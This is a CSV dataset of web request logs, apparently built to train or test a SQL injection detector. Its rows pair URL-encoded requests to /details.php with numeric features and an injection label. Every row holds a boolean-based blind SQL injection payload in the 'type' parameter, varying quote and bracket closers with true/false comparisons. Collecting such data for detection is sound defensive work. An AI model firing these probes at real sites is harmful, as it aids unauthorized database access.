full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%27%29%20AND%202383%3D8695--%20fEnt,/details.php?prod=5&type=?') AND 2383=8695-- fEnt,192.168.43.6,1681395120.735791,1,25,97.8,2,12.0,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104--%20QLaa,/details.php?prod=5&type=?') AND 5104=5104-- QLaa,192.168.43.6,1681395120.792663,1,25,97.8,2,12.0,1
/details.php?prod=5&type=%3F%27%20AND%209764%3D1701--%20zKmQ,/details.php?prod=5&type=?' AND 9764=1701-- zKmQ,192.168.43.6,1681395120.797465,1,24,97.8,2,12.5,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104--%20gxKU,/details.php?prod=5&type=?' AND 5104=5104-- gxKU,192.168.43.6,1681395120.802544,1,24,97.8,2,12.5,1
/details.php?prod=5&type=%3F%22%20AND%205333%3D2454--%20PSuP,"/details.php?prod=5&type=?"" AND 5333=2454-- PSuP",192.168.43.6,1681395120.865,1,24,97.8,2,12.5,1
/details.php?prod=5&type=%3F%22%20AND%205104%3D5104--%20DNhI,"/details.php?prod=5&type=?"" AND 5104=5104-- DNhI",192.168.43.6,1681395120.870335,1,24,97.8,2,12.5,1
/details.php?prod=5&type=%3F%29%20AND%202096%3D6452%20AND%20%284056%3D4056,/details.php?prod=5&type=?) AND 2096=6452 AND (4056=4056,192.168.43.6,1681395120.87643,1,32,97.8,0,3.125,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104%20AND%20%286402%3D6402,/details.php?prod=5&type=?) AND 5104=5104 AND (6402=6402,192.168.43.6,1681395120.938336,1,32,97.8,0,3.125,1
/details.php?prod=5&type=%3F%29%29%20AND%201535%3D6860%20AND%20%28%288677%3D8677,/details.php?prod=5&type=?)) AND 1535=6860 AND ((8677=8677,192.168.43.6,1681395120.997679,1,34,97.8,0,2.9411764705882355,1
/details.php?prod=5&type=%3F%29%29%20AND%205104%3D5104%20AND%20%28%289761%3D9761,/details.php?prod=5&type=?)) AND 5104=5104 AND ((9761=9761,192.168.43.6,1681395121.002116,1,34,97.8,0,2.9411764705882355,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205675%3D6106%20AND%20%28%28%283678%3D3678,/details.php?prod=5&type=?))) AND 5675=6106 AND (((3678=3678,192.168.43.6,1681395121.006055,1,36,97.8,0,2.7777777777777777,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205104%3D5104%20AND%20%28%28%284939%3D4939,/details.php?prod=5&type=?))) AND 5104=5104 AND (((4939=4939,192.168.43.6,1681395121.009066,1,36,97.8,0,2.7777777777777777,1
/details.php?prod=5&type=%3F%20AND%204929%3D5154,/details.php?prod=5&type=? AND 4929=5154,192.168.43.6,1681395121.013405,1,16,97.8,0,6.25,1
/details.php?prod=5&type=%3F%20AND%205104%3D5104,/details.php?prod=5&type=? AND 5104=5104,192.168.43.6,1681395121.061311,1,16,97.8,0,6.25,1
/details.php?prod=5&type=%3F%27%29%20AND%207884%3D2455%20AND%20%28%27BLVX%27%3D%27BLVX,/details.php?prod=5&type=?') AND 7884=2455 AND ('BLVX'='BLVX,192.168.43.6,1681395121.065082,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104%20AND%20%28%27KcWD%27%3D%27KcWD,/details.php?prod=5&type=?') AND 5104=5104 AND ('KcWD'='KcWD,192.168.43.6,1681395121.069974,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205401%3D5219%20AND%20%28%28%27JfIK%27%3D%27JfIK,/details.php?prod=5&type=?')) AND 5401=5219 AND (('JfIK'='JfIK,192.168.43.6,1681395121.075137,1,38,97.8,1,5.2631578947368425,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205104%3D5104%20AND%20%28%28%27upML%27%3D%27upML,/details.php?prod=5&type=?')) AND 5104=5104 AND (('upML'='upML,192.168.43.6,1681395121.078728,1,38,97.8,1,5.2631578947368425,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205429%3D3904%20AND%20%28%28%28%27slbH%27%3D%27slbH,/details.php?prod=5&type=?'))) AND 5429=3904 AND ((('slbH'='slbH,192.168.43.6,1681395121.082896,1,40,97.8,1,5.0,1
